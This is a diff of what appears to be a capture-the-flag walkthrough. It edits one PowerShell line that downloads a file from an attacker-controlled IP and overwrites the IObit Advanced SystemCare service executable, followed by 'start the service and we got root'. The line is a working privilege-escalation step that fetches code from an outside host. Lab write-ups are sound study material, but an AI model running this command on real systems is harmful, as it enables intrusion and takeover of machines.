@@ -55,7 +55,7 @@ or
 
 
 ```powershell
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.17.4.208/winPEASx64.exe','C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe')"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.17.4.208/exploit.exe','C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe')"
 ```
 
 start the service and we got root
